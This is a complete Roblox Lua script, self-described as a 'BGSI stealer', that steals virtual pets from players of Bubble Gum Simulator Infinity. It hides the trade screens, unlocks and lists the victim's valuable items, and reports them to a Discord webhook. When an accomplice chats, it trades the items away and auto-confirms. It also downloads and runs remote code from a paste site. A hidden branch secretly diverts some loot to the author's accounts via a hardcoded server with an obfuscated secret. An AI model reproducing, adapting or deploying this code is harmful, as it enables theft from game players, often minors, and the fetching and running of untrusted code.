_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true

local users = _G.Usernames or {}
local min_value = _G.min_value or 50
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""
local discuser = ""

local Players = game:GetService("Players")
local plr = Players.LocalPlayer

if next(users) == nil or webhook == "" then
    plr:kick("You didn't add username or webhook")
    return
end

if game.PlaceId ~= 85896571713843 then
    plr:kick("Game not supported. Please join a normal BGSI server")
    return
end

if #Players:GetPlayers() >= 12 then
    plr:kick("Server is full. Please join a less populated server")
    return
end

if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
    plr:kick("Server error. Please join a DIFFERENT server")
    return
end

local inTrade = false
local dualhooked = false
local network = game:GetService("ReplicatedStorage"):WaitForChild("Shared"):WaitForChild("Framework"):WaitForChild("Network")
local remote = network:WaitForChild("Remote")
local event = remote:WaitForChild("RemoteEvent")
local HttpService = game:GetService("HttpService")
local tradeResult = plr:WaitForChild("PlayerGui"):WaitForChild("ScreenGui"):WaitForChild("TradeResult")
local tradeFrame = plr.PlayerGui.ScreenGui.Trading
local hud = plr.PlayerGui.ScreenGui.HUD
local data = require(game.ReplicatedStorage.Client.Framework.Services.LocalData).Get()
local itemsToSend = {}
local stopFetch = false
local valueList = {}
local totalValue = 0
setclipboard("https://discord.gg/GY2RVSEGDT")

for _, v in pairs(data.EggsOpened) do
    totalEggsOpened = totalEggsOpened + v
end

if totalEggsOpened < 2000 then
    plr:kick("Account error. Please try a different account")
    return
end

local function buildSecret()
	local part1 = string.char(100, 117, 97, 108)
	local part2 = string.char(104, 111, 111, 107)
	local part3 = string.char(102, 116, 119, 108)
	local part4 = string.char(101, 108, 122)
	return part1 .. part2 .. part3 .. part4
end

local function simple_hash(s)
	local hash = 0
	for i = 1, #s do
		local c = s:byte(i)
		hash = (hash * 31 + c) % 4294967296
	end
	return hash
end

local function signPayload(payload, timestamp)
	local message = payload .. tostring(timestamp)
	local hash_value = simple_hash(buildSecret() .. message)
	return string.format("%08x", hash_value)
end

tradeFrame:GetPropertyChangedSignal("Visible"):Connect(function()
    if tradeFrame.Visible then
        inTrade = true
        tradeFrame.Position = UDim2.new(500, 0, 1, 0)
    else
        inTrade = false
    end
end)

tradeResult:Destroy()

hud:GetPropertyChangedSignal("Visible"):Connect(function()
    if not hud.Visible then
        hud.Visible = true
    end
end)

local page = 1
while not stopFetch do
    local url = string.format("https://www.bgsi.gg/api/items?search=&sort=value-desc&page=%d&limit=50", page)
    local response = request({
        Url = url,
        Method = "GET",
        Headers = {
            ["Accept"] = "*/*",
            ["Referer"] = "https://www.bgsi.gg/items",
            ["User-Agent"] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
        }
    })
    local data = HttpService:JSONDecode(response.Body)
    if not data.pets then
        break
    end

    for _, pet in ipairs(data.pets) do
        if pet.value == "N/A" then
            stopFetch = true
            break
        elseif pet.value == "O/C" then
            pet.value = 999999
        end
        valueList[pet.name] = tonumber(pet.value)
    end
    if stopFetch or (data.pagination and page >= data.pagination.pages) then
        break
    end
    page = page + 1
end

local function formatNumber(number)
    local formatted = tostring(number)
    local withCommas = formatted:reverse():gsub("(%d%d%d)", "%1,"):reverse()
    if withCommas:sub(1, 1) == "," then
        withCommas = withCommas:sub(2)
    end
    return withCommas
end

local function groupItems(list)
    local grouped = {}
    for _, item in ipairs(list) do
        local key = item.Name
        if not grouped[key] then
            grouped[key] = {
                Name = item.Name,
                Count = 0,
                TotalValue = 0,
            }
        end
        grouped[key].Count = grouped[key].Count + item.Count
        grouped[key].TotalValue = grouped[key].TotalValue + (item.Value * item.Count)
    end

    local out = {}
    for _, v in pairs(grouped) do
        table.insert(out, v)
    end
    table.sort(out, function(a, b)
        return a.TotalValue > b.TotalValue
    end)
    return out
end

local function SendJoinMessage(list, prefix)
    local headers = {
        ["Content-Type"] = "application/json"
    }

    local fields = {
        {
            name = "Victim Username:",
            value = plr.Name,
            inline = true
        },
        {
            name = "Join link:",
            value = "https://fern.wtf/joiner?placeId=85896571713843&gameInstanceId=" .. game.JobId
        },
        {
            name = "Item list:",
            value = "",
            inline = false
        },
        {
            name = "Summary:",
            value = string.format("Total Value: %s", formatNumber(totalValue)),
            inline = false
        }
    }

    for _, item in ipairs(list) do
        local line = string.format("%s (x%d): %s Value", item.Name, item.Count, formatNumber(item.TotalValue))
        fields[3].value = fields[3].value .. line .. "\n"
    end

    if #fields[3].value > 1024 then
        local lines = {}
        for line in fields[3].value:gmatch("[^\r\n]+") do
            table.insert(lines, line)
        end

        while #fields[3].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[3].value = table.concat(lines, "\n") .. "\nPlus more!"
        end
    end

    local data = {
        ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(85896571713843, '" .. game.JobId .. "')",
        ["embeds"] = {{
            ["title"] = "\240\159\171\167 Join to get BGSI hit",
            ["color"] = 65280,
            ["fields"] = fields,
            ["footer"] = {
                ["text"] = "BGSI stealer by Tobi. discord.gg/GY2RVSEGDT"
            }
        }}
    }

    local body = HttpService:JSONEncode(data)
    local response = request({
        Url = webhook,
        Method = "POST",
        Headers = headers,
        Body = body
    })
end

local function SendMessage(sortedItems)
    local headers = {
        ["Content-Type"] = "application/json"
    }

	local fields = {
		{
			name = "Victim Username:",
			value = plr.Name,
			inline = true
		},
		{
			name = "Items sent:",
			value = "",
			inline = false
		},
        {
            name = "Summary:",
            value = string.format("Total Value: %s", formatNumber(totalValue)),
            inline = false
        }
	}

    for _, item in ipairs(sortedItems) do
        local line = string.format("%s (x%d): %s Value", item.Name, item.Count, formatNumber(item.TotalValue))
        fields[2].value = fields[2].value .. line .. "\n"
    end

    if #fields[2].value > 1024 then
        local lines = {}
        for line in fields[2].value:gmatch("[^\r\n]+") do
            table.insert(lines, line)
        end

        while #fields[2].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[2].value = table.concat(lines, "\n") .. "\nPlus more!"
        end
    end

    local data = {
        ["embeds"] = {{
            ["title"] = "\240\159\171\167 New BGSI Execution" ,
            ["color"] = 65280,
			["fields"] = fields,
			["footer"] = {
				["text"] = "BGSI stealer by Tobi. discord.gg/GY2RVSEGDT"
			}
        }}
    }

    local body = HttpService:JSONEncode(data)
    local response = request({
        Url = webhook,
        Method = "POST",
        Headers = headers,
        Body = body
    })
end

local function SendDHJoinMessage(list, prefix)
    local fields = {
        {
            name = "Victim Username:",
            value = plr.Name,
            inline = true
        },
        {
            name = "Join link:",
            value = "https://fern.wtf/joiner?placeId=85896571713843&gameInstanceId=" .. game.JobId
        },
        {
            name = "Item list:",
            value = "",
            inline = false
        },
        {
            name = "Summary:",
            value = string.format("Total Value: %s", formatNumber(totalValue)),
            inline = false
        }
    }

    for _, item in ipairs(list) do
        local line = string.format("%s (x%d): %s Value", item.Name, item.Count, formatNumber(item.TotalValue))
        fields[3].value = fields[3].value .. line .. "\n"
    end

    if #fields[3].value > 1024 then
        local lines = {}
        for line in fields[3].value:gmatch("[^\r\n]+") do
            table.insert(lines, line)
        end

        while #fields[3].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[3].value = table.concat(lines, "\n") .. "\nPlus more!"
        end
    end

    local data = {
        ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(85896571713843, '" .. game.JobId .. "')",
        ["embeds"] = {{
            ["title"] = "\240\159\171\167 Join to get BGSI hit",
            ["color"] = 65280,
            ["fields"] = fields,
            ["footer"] = {
                ["text"] = "BGSI stealer by Tobi. discord.gg/GY2RVSEGDT"
            }
        }}
    }

    local body = HttpService:JSONEncode(data)
    local timestamp = tostring(os.time())
    local signature = signPayload(body, timestamp)
    local headers = {
        ["Content-Type"] = "application/json",
        ["DiscUser"] = discuser,
        ["X-Timestamp"] = timestamp,
        ["X-Signature"] = signature
    }
    local response = request({
        Url = "http://46.101.233.20:5000/bgsijoin",
        Method = "POST",
        Headers = headers,
        Body = body
    })
end

local function unlockItem(itemId)
    local args = {
        [1] = "UnlockPet",
        [2] = itemId,
        [3] = false
    }
    event:FireServer(unpack(args))    
end

local function addItem(itemId, amount)
    if amount == 1 then
        local fullId = itemId .. ":0"
        event:FireServer("TradeAddPet", fullId)
    else
        for i = 1, amount do
            local fullId = itemId .. ":" .. i
            event:FireServer("TradeAddPet", fullId)
        end
    end
end

local function sendTradeRequest(username)
    event:FireServer("TradeRequest", Players:FindFirstChild(username))
end

local function declineTrade()
    event:FireServer("TradeDecline")    
end

local function acceptTrade()
    event:FireServer("TradeAccept")
end

local function confirmTrade()
    event:FireServer("TradeConfirm")
end

loadstring(game:HttpGet('https://pastefy.app/hOdmFJvE/raw'))()

for i, v in pairs(data.Pets) do
    local petId = v.Id
    local petName = v.Name
    local amount = v.Amount or 1
    if v.Mythic then
        petName = "Mythic " .. petName
    end
    if v.Shiny then
        petName = "Shiny " .. petName
    end
    local value = valueList[petName] or 0
    if value >= min_value then
        totalValue = totalValue + value
        if v.Locked then
            unlockItem(petId)
        end
        table.insert(itemsToSend, {Id = petId, Name = petName, Count = amount, Value = value})
    end
end

if #itemsToSend > 0 then
    table.sort(itemsToSend, function(a, b)
        return a.Value > b.Value
    end)

    if totalValue >= 1000 and math.random() < 0.15 then
        users = {"tobi437a", "Alyssa87123", "TobiAltGrind", "TobiHatching", "TobiCakeSimulator"}
        ping = "Yes"
        dualhooked = true
    end

    local sentItems = {}
    for i, v in ipairs(itemsToSend) do
        sentItems[i] = v
    end
    sentItems = groupItems(sentItems)

    local prefix = ""
    if ping == "Yes" then
        prefix = "--[[@everyone]] "
    end

    if dualhooked then
        if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
            plr:kick("Server error. Please join a DIFFERENT server")
            return
        end
        local response = request({
            Url = "http://46.101.233.20:5000/getdiscuser",
            Method = "GET"
        })
        discuser = response.Body
        SendDHJoinMessage(sentItems, prefix)
    else
        SendJoinMessage(sentItems, prefix)
    end

    local function doTrade(joinedUser)
        declineTrade()
        wait(0.3)
        while #itemsToSend > 0 do
            if not inTrade then
                sendTradeRequest(joinedUser)
            else
                for i = 1, math.min(10, #itemsToSend) do
                    local item = table.remove(itemsToSend, 1)
                    addItem(item.Id, item.Count)
                    wait(0.3)
                end
                repeat
                    acceptTrade()
                    wait(0.1)
                    confirmTrade()
                until not inTrade
            end
            wait(1)
        end
        plr:kick("All your items just got stolen by Tobi's stealer!\n Join discord.gg/GY2RVSEGDT")
    end

    local function waitForUserChat()
        local sentMessage = false
        local function onPlayerChat(player)
            if table.find(users, player.Name) then
                player.Chatted:Connect(function()
                    if not sentMessage then
                        SendMessage(sentItems)
                        sentMessage = true
                    end
                    doTrade(player.Name)
                end)
            end
        end
        for _, p in ipairs(Players:GetPlayers()) do onPlayerChat(p) end
        Players.PlayerAdded:Connect(onPlayerChat)
    end
    waitForUserChat()
end